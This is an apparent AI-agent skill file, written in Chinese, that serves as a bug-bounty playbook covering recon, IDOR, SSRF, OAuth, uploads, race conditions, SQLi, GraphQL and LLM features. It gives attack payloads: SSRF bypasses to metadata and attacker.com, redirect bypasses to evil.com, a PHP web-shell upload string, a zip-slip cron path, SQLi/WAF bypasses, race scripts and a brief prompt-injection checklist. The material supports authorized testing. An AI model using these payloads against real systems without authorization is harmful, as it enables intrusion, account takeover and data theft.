---
name: bug-bounty
description: "漏洞赏金总编排器 —— 完整流程：侦察、狩猎前学习、漏洞挖掘（30+ 类）、A→B 链式利用、AI/LLM 测试（ASI01-ASI10）、语言特定 grep、绕过表，以及报告撰写（7 问门禁、CVSS 3.1、真人语气模板）。适用于任何漏洞赏金任务 —— 启动新目标、侦察、挖掘特定漏洞、源码审计、AI 功能测试或撰写报告。中文触发词：漏洞赏金、安全测试、渗透测试、漏洞挖掘"
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux, macos]
metadata:
  tags: [bug-bounty, recon, redteam]
  category: redteam
---

# 漏洞赏金主工作流

完整流程：侦察 -> 学习 -> 狩猎 -> 验证 -> 报告。一个技能搞定一切。

## When to Use

- 任何漏洞赏金任务 —— 启动新目标、侦察、挖掘特定漏洞、源码审计、AI 功能测试。
- 撰写报告。

## Prerequisites

- 针对目标的明确授权、目标边界和速率限制。
- 工具：`arjun`、`chaos`、`curl`、`dalfox`、`dnsx`、`ffuf`、`gau`、`gf`、`gh`、`httpx`。
- 一个可写的证据目录：`export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`。
- 对于任何改变状态的步骤（写入、上传、凭据尝试），在执行命令前立即获得明确确认。

## How to Run

```bash
# Set once per engagement; every step below uses these.
TARGET="example.com"   # or the engagement target
export OUTPUT_DIR="${OUTPUT_DIR:-./output}"

# THE ONE RULE: Always use -ac (auto-calibrate filters noise automatically)
ffuf -w wordlist.txt -u "https://$TARGET/FUZZ" -ac

# Authenticated raw request file — IDOR testing (save Burp request to req.txt, replace ID with FUZZ)
seq 1 10000 | ffuf --request req.txt -w - -ac

# Authenticated API endpoint brute
ffuf -u "https://$TARGET/api/FUZZ" -w wordlist.txt -H "Cookie: session=TOKEN" -ac

# Parameter discovery
ffuf -w ~/wordlists/burp-parameter-names.txt -u "https://$TARGET/api/endpoint?FUZZ=test" -ac -mc 200

# Hidden POST parameters
ffuf -w ~/wordlists/burp-parameter-names.txt -X POST -d "FUZZ=test" -u "https://$TARGET/api/endpoint" -ac
```

## Procedure

下面的各个阶段就是流程本身。保持每个探测有界（`--max-time`），在 `OUTPUT_DIR` 下记录证据，并在 Pitfalls 中列出的停止条件处停止。

## 唯一重要的问题

> **“攻击者能否立刻（RIGHT NOW）对一名没有做出任何异常行为的真实用户实施这一攻击 —— 并且它是否造成真实损害（资金被盗、PII 泄露、账户接管、代码执行）？”**
>
> 如果答案是“否” —— **停下。不要写。不要继续探索。继续下一个。**

### 理论漏洞 = 浪费时间。立即扼杀这些：

| 模式 | 扼杀理由 |
|---|---|
| “理论上可能允许……” | 不可利用 = 不是漏洞 |
| “具备 X、Y、Z 条件的攻击者可能……” | 前置条件太多 |
| “实现方式错误但没有实际影响” | 有错但无害 = 不是漏洞 |
| 含漏洞的死代码 | 不可达 = 不是漏洞 |
| 不含密钥的 source map | 无影响 |
| 仅 DNS 回调的 SSRF | 需要数据外带或内网访问 |
| 单独的开放重定向 | 需要 ATO 或 OAuth 链 |
| “如果……就可能被用于链式利用” | 先把链构造出来，再报告 |

**你必须证明实际损害。“可能”不是漏洞。证明它能工作，否则放弃。**

---

## 关键规则

1. **先读完整范围** —— 确认每个资产/域名都属于目标组织
2. **不要理论漏洞** —— “攻击者能否立刻窃取资金、泄露 PII、接管账户或执行代码？”如果不能，停下。
3. **快速扼杀弱发现** —— 在撰写任何报告之前先跑 7 问门禁
4. **先验证再写** —— 优先检查 CHANGELOG、设计文档、部署脚本
5. **一次只挖一类漏洞** —— 深入，不要撒网
6. **确认数据并非本就公开** —— 在报告 API“泄露”之前，先用无痕模式检查 Web 界面
7. **5 分钟规则** —— 如果目标在探测 5 分钟后毫无结果（全是 401/403/404），继续下一个
8. **影响优先的狩猎** —— 问“如果认证被攻破，最坏的情况是什么？”如果没有有价值的东西，跳过该目标
9. **凭据泄露需要利用证明** —— 找到密钥还不够，必须证明它们能访问什么
10. **停止浅层侦察的螺旋** —— 不要探测 403，不要 grep 分析密钥，不要检查毫无结果的 staging 域名
11. **业务影响优先于漏洞类别** —— 严重性取决于上下文，而不只是漏洞类型
12. **深入理解目标** —— 狩猎前，像真实用户一样学习这个应用
13. **不要过度依赖自动化** —— 自动扫描会撞 WAF、触发速率限制，而且找到的漏洞和别人一样
14. **狩猎竞争较少的漏洞类别** —— XSS/SSRF/XXE 竞争最激烈。扩展到：缓存投毒、Android/移动端漏洞、业务逻辑、竞态条件、OAuth/OIDC 链、CI/CD 流水线攻击
15. **一小时规则** —— 在一个目标上卡了一小时毫无进展？切换上下文
16. **双眼法** —— 把系统化测试（检查清单）与异常检测（留意意外行为）结合起来
17. **T 型知识** —— 在一个领域深入，在其他领域广泛

> 关于完整的狩猎方法论 —— 5 阶段非线性工作流、开发者心理框架、会话纪律、按阶段分流的命令行路由，以及 Wide/Deep 路线选择 —— 见 **`skills/bb-methodology/SKILL.md`**。

---

## A->B 漏洞信号方法（集群狩猎）

**当你发现漏洞 A 时，就在附近系统性地寻找 B 和 C。** 这是漏洞赏金中最强大的方法论之一。单个漏洞只值一份钱，链式漏洞的回报高 3-10 倍。

### 已知的 A->B->C 链

| 漏洞 A（信号） | 寻找漏洞 B | 升级到 C |
|----------------|---------------|---------------|
| IDOR（读） | 同一端点上的 PUT/DELETE | 完整的账户数据操纵 |
| SSRF（任意） | 云元数据 169.254.169.254 | IAM 凭据外带 -> RCE |
| XSS（存储型） | 检查会话 Cookie 是否设置了 HttpOnly | 会话劫持 -> ATO |
| 开放重定向 | OAuth redirect_uri 接受你的域名 | 授权码窃取 -> ATO |
| S3 桶可列目录 | 枚举 JS 包 | grep OAuth client_secret -> OAuth 链 |
| 速率限制绕过 | OTP 暴力破解 | 账户接管 |
| GraphQL introspection | 缺少字段级授权 | 大规模 PII 外带 |
| 调试端点 | 泄露的环境变量 | 云凭据 -> 基础设施访问 |
| CORS 反射源 | 用 credentials: include 测试 | 带凭据的数据窃取 |
| Host 头注入 | 密码重置投毒 | 通过重置链接 ATO |

### 集群狩猎流程（6 步）

```
1. CONFIRM A     Verify bug A is real with an HTTP request
2. MAP SIBLINGS  Find all endpoints in the same controller/module/API group
3. TEST SIBLINGS Apply the same bug pattern to every sibling
4. CHAIN         If sibling has different bug class, try combining A + B
5. QUANTIFY      "Affects N users" / "exposes $X value" / "N records"
6. REPORT        One report per chain (not per bug). Chains pay more.
```

### 真实案例

**Coinbase S3->Bundle->Secret->OAuth 链：**
```
A: S3 bucket publicly listable (Low alone)
B: JS bundles contain OAuth client credentials
C: OAuth flow missing PKCE enforcement
Result: Full auth code interception chain
```

**Vienna Chatbot 链：**
```
A: Debug parameter active in production (Info alone)
B: Chatbot renders HTML in response (dangerouslySetInnerHTML)
C: Stored XSS via bot response visible to other users
Result: P2 finding with real impact
```

---

# 顶尖 1% 黑客思维

## 精英黑客的思维方式有何不同

**普通猎人**：跑工具、对照检查清单，30 分钟后就放弃。
**顶尖 1%**：构建应用内部结构的心智模型。会问“为什么它要这样工作？”，不是“这个端点做什么？”，而是“是什么业务决策让开发者这样实现，他们可能走了什么捷径？”

## 狩猎前的心智框架

### 第 1 步：皇冠珠宝思维
在动手之前，先问：“如果我是攻击者，我只能对这个应用做一件事，什么造成的损害最大？”
- 金融应用 -> 抽干资金，转入攻击者账户
- 医疗 -> PII 泄露，HIPAA 违规
- SaaS -> 租户数据越界，管理员接管
- 身份提供商 -> 整条 SSO 链被攻陷

### 第 2 步：开发者共情
像构建该功能的开发者一样思考：
- 最简实现是什么？
- 一个疲惫的开发者在凌晨 2 点会走什么捷径？
- 认证在哪里检查 —— 控制器？中间件？数据库层？
- 如果不先经过端点 A 而直接调用端点 B，会发生什么？

### 第 3 步：信任边界映射
```
Client -> CDN -> Load Balancer -> App Server -> Database
         ^               ^              ^
    Where does app STOP trusting input?
    Where does it ASSUME input is already validated?
```

### 第 4 步：功能交互思维
- 这个新功能复用了旧认证，还是有自己的认证？
- 移动端 API 是否与 Web 应用共享认证逻辑？
- 这个功能是同一团队构建的，还是第三方？

## 顶尖 1% 的心智检查清单
- [ ] 我知道应用的核心业务模式
- [ ] 我已作为真实用户使用该应用 15 分钟以上
- [ ] 我知道技术栈（语言、框架、认证系统、缓存）
- [ ] 我至少读过 3 份该项目的已披露报告
- [ ] 我准备好了 2 个测试账户（攻击者 + 受害者）
- [ ] 我已确定主要目标：今天我要找的那一件皇冠珠宝

## 顶尖猎人的思维规则

**“猎功能，而不是端点”** —— 找到服务某个功能的所有端点，然后测试它们之间的交互。

**“授权不一致是你的朋友”** —— 如果应用在 9 个地方检查了授权，唯独第 10 个没有，那就是你的漏洞。

**“新的 == 未审查的”** —— 过去 30 天内上线的功能安全成熟度最低。

**“思考二阶”** —— 二阶 SSRF：URL 存入数据库，由 cron 任务取回。二阶 XSS：存储时干净，在管理面板中不安全地渲染。

**“跟着钱走”** —— 任何涉及支付、计费、额度、退款的功能，都是开发者最容易走安全捷径的地方。

**“移动应用使用的 API”** —— 移动应用常常调用更旧/不同的 API 版本。同一家公司，不同的攻击面，成熟度更低。

**“差分找漏洞”** —— 对比旧 API 文档与新文档。对比移动端 API 与 Web API。对比免费用户能请求的内容与付费用户得到的响应。

---

# 工具

## Go 二进制工具
| 工具 | 用途 |
|------|-----|
| subfinder | 被动子域名枚举 |
| httpx | 探测存活主机 |
| dnsx | DNS 解析 |
| nuclei | 模板扫描器 |
| katana | 爬虫 |
| waybackurls | 归档 URL |
| gau | 已知 URL |
| dalfox | XSS 扫描器 |
| ffuf | 模糊测试器 |
| anew | 去重追加 |
| qsreplace | 替换参数值 |
| assetfinder | 子域名枚举 |
| gf | Grep 模式（xss、sqli、ssrf、redirect） |
| interactsh-client | OOB 回调 |

## 需要时安装的工具
| 工具 | 用途 | 安装 |
|------|-----|---------|
| arjun | 隐藏参数发现 | `pip3 install arjun` |
| paramspider | URL 参数挖掘 | `pip3 install paramspider` |
| kiterunner | API 端点爆破 | `go install github.com/assetnote/kiterunner/cmd/kr@latest` |
| cloudenum | 云资产枚举 | `pip3 install cloud_enum` |
| trufflehog | 密钥扫描 | `brew install trufflehog` |
| gitleaks | 密钥扫描 | `brew install gitleaks` |
| XSStrike | 高级 XSS 扫描器 | `pip3 install xsstrike` |
| SecretFinder | JS 密钥提取 | `pip3 install secretfinder` |
| sqlmap | SQL 注入 | `pip3 install sqlmap` |
| subzy | 子域名接管 | `go install github.com/LukaSikic/subzy@latest` |

## 静态分析（Semgrep 快速审计）
```bash
# Install: pip3 install semgrep

# Broad security audit
semgrep --config=p/security-audit ./
semgrep --config=p/owasp-top-ten ./

# Language-specific rulesets
semgrep --config=p/javascript ./src/
semgrep --config=p/python ./
semgrep --config=p/golang ./
semgrep --config=p/php ./
semgrep --config=p/nodejs ./

# Targeted rules
semgrep --config=p/sql-injection ./
semgrep --config=p/jwt ./

# Custom pattern (example: find SQL concat in Python)
semgrep --pattern 'cursor.execute("..." + $X)' --lang python .

# Output to file for analysis
semgrep --config=p/security-audit ./ --json -o semgrep-results.json 2>/dev/null
cat semgrep-results.json | jq '.results[] | select(.extra.severity == "ERROR") | {path:.path, check:.check_id, msg:.extra.message}'
```

## FFUF 高级技巧
```bash
# THE ONE RULE: Always use -ac (auto-calibrate filters noise automatically)
ffuf -w wordlist.txt -u https://target.com/FUZZ -ac

# Authenticated raw request file — IDOR testing (save Burp request to req.txt, replace ID with FUZZ)
seq 1 10000 | ffuf --request req.txt -w - -ac

# Authenticated API endpoint brute
ffuf -u https://TARGET/api/FUZZ -w wordlist.txt -H "Cookie: session=TOKEN" -ac

# Parameter discovery
ffuf -w ~/wordlists/burp-parameter-names.txt -u "https://target.com/api/endpoint?FUZZ=test" -ac -mc 200

# Hidden POST parameters
ffuf -w ~/wordlists/burp-parameter-names.txt -X POST -d "FUZZ=test" -u "https://target.com/api/endpoint" -ac

# Subdomain scan
ffuf -w subs.txt -u https://FUZZ.target.com -ac

# Filter strategies:
# -fc 404,403          Filter status codes
# -fs 1234             Filter by response size
# -fw 50               Filter by word count
# -fr "not found"      Filter regex in response body
# -rate 5 -t 10        Rate limit + fewer threads for stealth
# -e .php,.bak,.old    Add extensions
# -o results.json      Save output
```

## AI 辅助工具
- **strix**（usestrix.com）—— 用于自动化初步扫描的开源 AI 扫描器

---

# 阶段 1：侦察

## 标准侦察流程
```bash
# Step 1: Subdomains
subfinder -d TARGET -silent | anew /tmp/subs.txt
assetfinder --subs-only TARGET | anew /tmp/subs.txt

# Step 2: Resolve + live hosts
cat /tmp/subs.txt | dnsx -silent | httpx -silent -status-code -title -tech-detect -o /tmp/live.txt

# Step 3: URL collection
cat /tmp/live.txt | awk '{print $1}' | katana -d 3 -silent | anew /tmp/urls.txt
echo TARGET | waybackurls | anew /tmp/urls.txt
gau TARGET | anew /tmp/urls.txt

# Step 4: Nuclei scan
nuclei -l /tmp/live.txt -severity critical,high,medium -silent -o /tmp/nuclei.txt

# Step 5: JS secrets
cat /tmp/urls.txt | grep "\.js$" | sort -u > /tmp/jsfiles.txt
# Run SecretFinder on each JS file

# Step 6: GitHub dorking (if target has public repos)
# GitDorker -org TARGET_ORG -d dorks/alldorksv3
```

## 云资产枚举
```bash
# Manual S3 brute
for suffix in dev staging test backup api data assets static cdn; do
  code=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" "https://${TARGET}-${suffix}.s3.amazonaws.com/")
  [ "$code" != "404" ] && echo "$code ${TARGET}-${suffix}.s3.amazonaws.com"
done
```

## API 端点发现
```bash
# ffuf API endpoint brute
ffuf -u https://TARGET/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,301,302,403 -ac
```

## HackerOne 范围获取
```bash
curl --max-time 30 --connect-timeout 10 -s "https://hackerone.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { team(handle: \"PROGRAM_HANDLE\") { name url policy_scopes(archived: false) { edges { node { asset_type asset_identifier eligible_for_bounty instruction } } } } }"}' \
  | jq '.data.team.policy_scopes.edges[].node'
```

## 快速收益检查清单
- [ ] 子域名接管（`subjack`、`subzy`）
- [ ] 暴露的 `.git`（`/.git/config`）
- [ ] 暴露的环境文件（`/.env`、`/.env.local`）
- [ ] 管理面板的默认凭据
- [ ] JS 密钥（SecretFinder、jsluice）
- [ ] 开放重定向（`?redirect=`、`?next=`、`?url=`）
- [ ] CORS 配置错误（测试 `Origin: https://evil.com` + credentials）
- [ ] S3/云存储桶
- [ ] GraphQL introspection 已启用
- [ ] Spring actuators（`/actuator/env`、`/actuator/heapdump`）
- [ ] Firebase 开放读取（`https://TARGET.firebaseio.com/.json`）

## 技术指纹识别

| 信号 | 技术 |
|---|---|
| Cookie：`XSRF-TOKEN` + `*_session` | Laravel |
| Cookie：`PHPSESSID` | PHP |
| Header：`X-Powered-By: Express` | Node.js/Express |
| 响应：`wp-json`/`wp-content` | WordPress |
| 响应：`{"errors":[{"message":` | GraphQL |
| Header：`X-Powered-By: Next.js` | Next.js |

## 框架快速收益

**Laravel**：`/horizon`、`/telescope`、`/.env`、`/storage/logs/laravel.log`
**WordPress**：`/wp-json/wp/v2/users`、`/xmlrpc.php`、`/?author=1`
**Node.js**：`/.env`、`/graphql`（introspection）、`/_debug`
**AWS Cognito**：`/oauth2/userInfo`（泄露 Pool ID），CORS 反射任意源

## 源代码侦察
```bash
# Security surface
cat SECURITY.md 2>/dev/null; cat CHANGELOG.md | head -100 | grep -i "security\|fix\|CVE"
git log --oneline --all --grep="security\|CVE\|fix\|vuln" | head -20

# Dev breadcrumbs
grep -rn "TODO\|FIXME\|HACK\|UNSAFE" --include="*.ts" --include="*.js" | grep -iv "test\|spec"

# Dangerous patterns (JS/TS)
grep -rn "eval(\|innerHTML\|dangerouslySetInner\|execSync" --include="*.ts" --include="*.js" | grep -v node_modules
grep -rn "===.*token\|===.*secret\|===.*hash" --include="*.ts" --include="*.js"
grep -rn "fetch(\|axios\." --include="*.ts" | grep "req\.\|params\.\|query\."

# Dangerous patterns (Solidity)
grep -rn "tx\.origin\|delegatecall\|selfdestruct\|block\.timestamp" --include="*.sol"
```

### 语言特定的 Grep 模式

```bash
# JavaScript/TypeScript -- prototype pollution, postMessage, RCE sinks
grep -rn "__proto__\|constructor\[" --include="*.js" --include="*.ts" | grep -v node_modules
grep -rn "postMessage\|addEventListener.*message" --include="*.js" | grep -v node_modules
grep -rn "child_process\|execSync\|spawn(" --include="*.js" | grep -v node_modules

# Python -- pickle, yaml.load, eval, shell injection
grep -rn "pickle\.loads\|yaml\.load\|eval(" --include="*.py" | grep -v test
grep -rn "subprocess\|os\.system\|os\.popen" --include="*.py" | grep -v test
grep -rn "__import__\|exec(" --include="*.py"

# PHP -- type juggling, unserialize, LFI
grep -rn "unserialize\|eval(\|preg_replace.*e" --include="*.php"
grep -rn "==.*password\|==.*token\|==.*hash" --include="*.php"
grep -rn "\$_GET\|\$_POST\|\$_REQUEST" --include="*.php" | grep "include\|require\|file_get"

# Go -- template.HTML, race conditions
grep -rn "template\.HTML\|template\.JS\|template\.URL" --include="*.go"
grep -rn "go func\|sync\.Mutex\|atomic\." --include="*.go"

# Ruby -- YAML.load, mass assignment
grep -rn "YAML\.load[^_]\|Marshal\.load\|eval(" --include="*.rb"
grep -rn "attr_accessible\|permit(" --include="*.rb"

# Rust -- panic on network input, unsafe blocks
grep -rn "\.unwrap()\|\.expect(" --include="*.rs" | grep -v "test\|encode\|to_bytes\|serialize"
grep -rn "unsafe {" --include="*.rs" -B5 | grep "read\|recv\|parse\|decode"
grep -rn "as u8\|as u16\|as u32\|as usize" --include="*.rs" | grep -v "checked\|saturating\|wrapping"
```

---

# 阶段 2：学习（狩猎前情报）

## 阅读已披露报告
```bash
# By program on HackerOne
curl --max-time 30 --connect-timeout 10 -s "https://hackerone.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ hacktivity_items(first:25, order_by:{field:popular, direction:DESC}, where:{team:{handle:{_eq:\"PROGRAM\"}}}) { nodes { ... on HacktivityDocument { report { title severity_rating } } } } }"}' \
  | jq '.data.hacktivity_items.nodes[].report'
```

## “改了什么”方法
1. 找到类似技术的已披露报告
2. 获取修复提交
3. 阅读 diff —— 识别反模式
4. 在你的目标中 grep 同样的反模式

## 威胁模型模板
```
TARGET: _______________
CROWN JEWELS: 1.___ 2.___ 3.___
ATTACK SURFACE:
  [ ] Unauthenticated: login, register, password reset, public APIs
  [ ] Authenticated: all user-facing endpoints, file uploads, API calls
  [ ] Cross-tenant: org/team/workspace ID parameters
  [ ] Admin: /admin, /internal, /debug
HIGHEST PRIORITY (crown jewel x easiest entry):
  1.___ 2.___ 3.___
```

## 顶级报告中的 6 个关键模式
1. **功能复杂度 = 漏洞面** —— 导入、集成、多租户、多步骤工作流
2. **开发者不一致 = 最强证据** —— 一处用 `timingSafeEqual`，别处用 `===`
3. **“else 分支”漏洞** —— 代理/网关在 else 路径中不经校验直接传递原始 token
4. **导入/导出 = SSRF** —— 每个“从 URL 导入”功能历史上都有 SSRF
5. **次级/遗留端点 = 无认证** —— `/api/v1/` 有防护，而 `/api/` 没有
6. **金融操作中的竞态窗口** —— 先检查后扣减作为两次数据库操作 = 重复消费

---

# 阶段 3：狩猎

## 笔记系统（没有它就别狩猎）
```markdown
# TARGET: company.com -- SESSION 1

## Interesting Leads (not confirmed bugs yet)
- [14:22] /api/v2/invoices/{id} -- no auth check visible in source, testing...

## Dead Ends (don't revisit)
- /admin -> IP restricted, confirmed by trying 15+ bypass headers

## Anomalies
- GET /api/export returns 200 even when session cookie is missing
- Response time: POST /api/check-user -> 150ms (exists) vs 8ms (doesn't)

## Rabbit Holes (time-boxed, max 15 min each)
- [ ] 10 min: JWT kid injection on auth endpoint

## Confirmed Bugs
- [15:10] IDOR on /api/invoices/{id} -- read+write
```

## 子域名类型 -> 狩猎策略
- **dev/staging/test**：调试端点、禁用的认证、详细错误信息
- **admin/internal**：默认凭据、IP 绕过 header（`X-Forwarded-For: 127.0.0.1`）
- **api/api-v2**：用 kiterunner 枚举，检查更旧且无防护的版本
- **auth/sso**：OAuth 配置错误、`redirect_uri` 中的开放重定向
- **upload/cdn**：CORS、路径穿越、存储型 XSS

## CVE 种子化审计方法
1. **构建 CVE 评估集** —— 收集目标代码库的 5-10 个历史 CVE
2. **复现旧漏洞** —— 验证你能在旧代码中找到该模式
3. **向前模式匹配** —— 在当前代码中搜索同样的反模式
4. **关注宽广的攻击面** —— JS 引擎、解析器、任何处理不可信外部输入的东西

## Rust/区块链源代码（血泪教训）

**panic 路径：编码 vs 解码** —— 编码路径上的 `.unwrap()` 不是攻击者可触发的。只有对网络输入的反序列化/解码产生的 panic 才可利用。

**“已知的 TODO”不是缓解措施** —— 像 `// Votes are not signed for now` 这样的注释并不意味着安全。

**从已确认发现进行模式化狩猎** —— 如果 `verify_signed_vote` 有问题，检查 `verify_signed_proposal` 和 `verify_commit_signature`。

```bash
# Rust dangerous patterns (network-facing)
grep -rn "\.unwrap()\|\.expect(" --include="*.rs" | grep -v "test\|encode\|to_bytes\|serialize"
grep -rn "if let Ok\|let _ =" --include="*.rs" | grep -i "verify\|sign\|cert\|auth"
grep -rn "TODO\|FIXME\|not signed\|not verified\|for now" --include="*.rs" | grep -i "sign\|verify\|cert\|auth"
```

---

# 漏洞挖掘检查清单

## IDOR —— 不安全的直接对象引用

> Web2 中付费最多的类别 —— 占所有获得奖金的提交的 30%。

### IDOR 变体（10 种测试方式）

| 变体 | 测试内容 |
|---------|-------------|
| V1：直接 | 更改 URL 路径中的对象 ID `/api/users/123` -> `/api/users/456` |
| V2：Body 参数 | 更改 POST/PUT JSON body 中的 ID `{"user_id": 456}` |
| V3：GraphQL node | `{ node(id: "base64(OtherType:123)") { ... } }` |
| V4：批量 | `/api/users?ids=1,2,3,4,5` —— 一次请求多个 ID |
| V5：嵌套 | 更改父级 ID：`/orgs/{org_id}/users/{user_id}` |
| V6：文件路径 | `/files/download?path=../other-user/file.pdf` |
| V7：可预测 | 顺序整数、时间戳、短 UUID |
| V8：方法互换 | GET 返回 403？在同一端点尝试 PUT/PATCH/DELETE |
| V9：版本回退 | v2 被拦截？尝试 `/api/v1/` 同一端点 |
| V10：Header 注入 | `X-User-ID: victim_id`、`X-Org-ID: victim_org` |

### IDOR 测试清单
- [ ] 创建两个账户（A = 攻击者，B = 受害者）
- [ ] 以 A 登录，执行所有操作，记录请求中的所有 ID
- [ ] 以 B 登录，用 B 的认证重放 A 的请求（使用 A 的 ID）
- [ ] 对每个端点都尝试互换 ID —— 不只是 GET，还有 PUT/DELETE/PATCH
- [ ] 检查 API v1/v2 差异
- [ ] 检查 GraphQL schema 中的 node() 查询
- [ ] 检查 WebSocket 消息中客户端提供的 ID
- [ ] 测试批量端点（能否一次请求多个 ID？）
- [ ] 尝试添加意外参数：`?user_id=other_user`

### IDOR 链（更高回报）
- IDOR + 读取 PII = Medium
- IDOR + 写入（修改他人数据）= High
- IDOR + 管理端点 = Critical（权限提升）
- IDOR + 账户接管路径 = Critical
- IDOR + 聊天机器人（LLM 读取其他用户数据）= High

## SSRF —— 服务端请求伪造

- [ ] 尝试云元数据：`http://169.254.169.254/latest/meta-data/`
- [ ] 尝试内部服务：`http://127.0.0.1:6379/`（Redis）、`:9200`（Elasticsearch）、`:27017`（MongoDB）
- [ ] 测试所有 IP 绕过技巧（见下表）
- [ ] 测试协议绕过：`file://`、`dict://`、`gopher://`
- [ ] 在以下位置寻找：webhook URL、从 URL 导入、头像 URL、PDF 生成器、XML 解析器

### SSRF IP 绕过表（11 种技巧）

| 绕过 | Payload | 备注 |
|--------|---------|-------|
| 十进制 IP | `http://2130706433/` | 127.0.0.1 的单个十进制形式 |
| 十六进制 IP | `http://0x7f000001/` | 十六进制表示 |
| 八进制 IP | `http://0177.0.0.1/` | 八进制 0177 = 127 |
| 短 IP | `http://127.1/` | 缩写形式 |
| IPv6 | `http://[::1]/` | IPv6 环回 |
| IPv6 映射 | `http://[::ffff:127.0.0.1]/` | IPv4 映射的 IPv6 |
| 重定向链 | `http://attacker.com/302->http://169.254.169.254` | 检查每一跳 |
| DNS 重绑定 | 注册解析到 127.0.0.1 的域名 | 检查时是外部，取回时是内部 |
| URL 编码 | `http://127.0.0.1%2523@attacker.com` | 解析器混淆 |
| 带圈字母数字 | `http://①②⑦.⓪.⓪.①` | Unicode 数字 |
| 协议走私 | `gopher://127.0.0.1:6379/_INFO` | Redis/其他协议 |

### SSRF 影响链
- 仅 DNS = Informational（不要提交）
- 可访问内部服务 = Medium
- 可读取云元数据 = High（密钥泄露）
- 云元数据 + 外带密钥 = Critical（云上代码执行）
- 可访问 Docker API = Critical（直接 RCE）

## OAuth / OIDC

- [ ] 缺少 `state` 参数 -> CSRF
- [ ] `redirect_uri` 接受通配符 -> ATO
- [ ] 缺少 PKCE -> 授权码窃取
- [ ] 隐式流程 -> referrer 中的 token 泄露
- [ ] 认证后重定向中的开放重定向 -> OAuth token 窃取链

### 开放重定向绕过表（11 种技巧）

在把开放重定向串联进 OAuth 授权码窃取时使用：

| 绕过 | Payload | 备注 |
|--------|---------|-------|
| 双重 URL 编码 | `%252F%252F` | 双重解码后为 `//` |
| 反斜杠 | `https://target.com\@evil.com` | 某些解析器把 `\` 归一化为 `/` |
| 缺少协议 | `//evil.com` | 协议相对 |
| @ 技巧 | `https://target.com@evil.com` | target.com 成为用户名 |
| 协议相对 | `///evil.com` | 三斜杠 |
| Tab/换行注入 | `//evil%[EXAMPLE_DOMAIN]` | 主机名中的空白 |
| Fragment 技巧 | `https://evil.com#target.com` | Fragment 误导校验 |
| 空字节 | `https://evil.com%00target.com` | 某些解析器在空字节处截断 |
| 参数污染 | `?next=target.com&next=evil.com` | 后值生效 |
| 路径混淆 | `/redirect/..%2F..%2Fevil.com` | 重定向中的路径穿越 |
| Unicode 归一化 | `https://evil.com/target.com` | 视觉混淆 |

## 文件上传

### 文件上传绕过表

| 绕过 | 技巧 |
|--------|-----------|
| 双扩展名 | `file.php.jpg`、`file.php%00.jpg` |
| 大小写变化 | `file.pHp`、`file.PHP5` |
| 替代扩展名 | `.phtml`、`.phar`、`.shtml`、`.inc` |
| Content-Type 伪造 | `image/jpeg` 头 + PHP 内容 |
| Magic bytes | `GIF89a; <?php system($_GET['c']); ?>` |
| .htaccess 上传 | `AddType application/x-httpd-php .jpg` |
| SVG XSS | `<svg onload=alert(1)>` |
| 竞态条件 | 在清理运行前上传并执行 |
| JPEG/PHP 多语言文件 | 同时是合法 JPEG 和合法 PHP |
| Zip slip | 压缩包内文件名 `../../etc/cron.d/shell` |

### Magic Bytes 参考
| 类型 | Hex |
|------|-----|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP/DOCX/XLSX | `50 4B 03 04` |

## 竞态条件

- [ ] 优惠券 / 促销码
- [ ] 礼品卡兑换
- [ ] 资金转账 / 提现
- [ ] 投票 / 评分限制
- [ ] 通过竞态暴力破解 OTP 验证

```bash
seq 20 | xargs -P 20 -I {} curl --max-time 30 --connect-timeout 10 -s -X POST https://TARGET/redeem \
  -H "Authorization: Bearer $TOKEN" -d 'code=PROMO10' &
wait
```

### Turbo Intruder —— 单包攻击（所有请求同时到达）
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False,
                           engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')  # all 20 fire in a single TCP packet

def handleResponse(req, interesting):
    table.add(req)
```

## 业务逻辑
- [ ] 购物车中的负数量
- [ ] 价格参数篡改
- [ ] 工作流跳过（例如不结账就付款）
- [ ] 通过注册字段进行角色提升
- [ ] 降级后权限仍然保留

## XSS —— 跨站脚本

### XSS 汇聚点（grep 这些）
```javascript
// HIGH RISK
innerHTML = userInput
outerHTML = userInput
document.write(userInput)
eval(userInput)
setTimeout(userInput, ...)    // string form
setInterval(userInput, ...)
new Function(userInput)

// MEDIUM RISK (context-dependent)
element.src = userInput        // JavaScript URI possible
element.href = userInput
location.href = userInput
```

### XSS 链（从中危升级到高危/严重）
- XSS + 敏感页面（银行、管理）= High
- XSS + CSRF token 窃取 = CSRF 绕过 -> 关键操作
- XSS + service worker = 跨页面持久 XSS
- XSS + 通过伪造登录表单窃取凭据 = ATO
- 聊天机器人响应中的 XSS = 存储型 XSS 链

## SQL 注入

### 检测
```text
# Single quote test
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--

# Error-based detection
'; SELECT 1/0--    # divide by zero error reveals SQLi
```

### 现代 SQLi WAF 绕过
```sql
-- Comment variation
/*!50000 SELECT*/ * FROM users
SE/**/LECT * FROM users
-- Case variation
SeLeCt * FrOm uSeRs
-- URL encoding
%27 OR %271%27=%271
-- Unicode apostrophe
' OR '1'='1
```

## GraphQL

### Introspection（单独 = Informational，但会暴露攻击面）
```graphql
{ __schema { types { name fields { name type { name } } } } }
```

### 缺少字段级授权
```graphql
# User query returns only own data
{ user(id: 1) { name email } }
# But node() bypasses per-object auth:
{ node(id: "dXNlcjoy") { ... on User { email phoneNumber ssn } } }
```

### 批量攻击（速率限制绕过）
```json
[
  {"query": "{ login(email: \"user@test.com\", password: \"pass1\") }"},
  {"query": "{ login(email: \"user@test.com\", password: \"pass2\") }"},
  "...100 more..."
]
```

## LLM / AI 功能

- [ ] 通过传给 LLM 的用户输入进行提示注入
- [ ] 通过 AI 处理的文档/URL 进行间接注入
- [ ] 聊天历史中的 IDOR（枚举会话 ID）
- [ ] 通过角色扮演/编码提取系统提示
- [ ] 通过代码执行命令行滥用实现 RCE
